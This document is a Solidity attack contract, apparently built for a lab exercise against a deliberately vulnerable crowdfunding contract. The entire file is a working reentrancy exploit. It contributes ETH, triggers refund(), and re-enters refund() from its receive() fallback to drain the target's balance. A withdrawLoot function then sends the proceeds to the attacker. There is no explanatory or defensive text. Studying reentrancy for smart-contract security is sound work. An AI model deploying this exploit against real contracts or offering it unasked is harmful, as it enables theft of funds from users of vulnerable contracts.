// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICrowdfundVulnerable {
    function contribute() external payable;
    function refund() external;
    function getBalance() external view returns (uint256);
    function owner() external view returns (address);
    function goal() external view returns (uint256);
    function totalRaised() external view returns (uint256);
}

contract RefundAttacker {
    ICrowdfundVulnerable public target;
    address public owner;
    address public attacker;

    modifier onlyAttacker() {
        require(msg.sender == attacker, "Not attacker");
        _;
    }

    event AttackStep(string message, uint256 attackerBalance, uint256 contractBalance);

    constructor(address _target) {
        target = ICrowdfundVulnerable(_target);
        owner = msg.sender;
        attacker = msg.sender;
    }

    // Attacker sends ETH to this contract balance (no interaction with the crowdfund yet).
    function fundAttacker() external payable onlyAttacker {
        require(msg.value > 0, "Need ETH");
        emit AttackStep("Attacker contract funded", address(this).balance, address(target).balance);
    }

    // Spend from attacker contract balance into the crowdfund contribute().
    function contributeToCrowdfund(uint256 amount) external onlyAttacker {
        require(amount > 0, "Amount must be > 0");
        require(address(this).balance >= amount, "Not enough balance");

        target.contribute{value: amount}();

        emit AttackStep("Attacker contract contributed", address(this).balance, address(target).balance);
    }

    function fundAndAttack() external payable onlyAttacker {
        require(msg.value > 0, "Need ETH");

        // initial contribution
        target.contribute{value: msg.value}();

        // trigger first refund
        target.refund();

        emit AttackStep("Fund and first refund triggered", address(this).balance, address(target).balance);
    }

    receive() external payable {
        emit AttackStep("Reentrancy executing...", address(this).balance, address(target).balance);

        if (address(target).balance >= 1 ether) {
            target.refund();
        }
    }

    function withdrawLoot() external onlyAttacker {
        uint256 amount = address(this).balance;
        payable(owner).transfer(amount);

        emit AttackStep("Loot withdrawn to owner", 0, address(target).balance);
    }

    function getMyBalance() external view returns (uint256) {
        return address(this).balance;
    }
    function getCrowdfundInfo()
        external
        view
        returns (address _owner, uint256 _goal, uint256 _totalRaised, uint256 _balance)
    {
        _owner = target.owner();
        _goal = target.goal();
        _totalRaised = target.totalRaised();
        _balance = target.getBalance();
    }

    function getAddresses() external view returns (address crowdfundAddress, address attackerAddress) {
        crowdfundAddress = address(target);
        attackerAddress = attacker;
    }
}
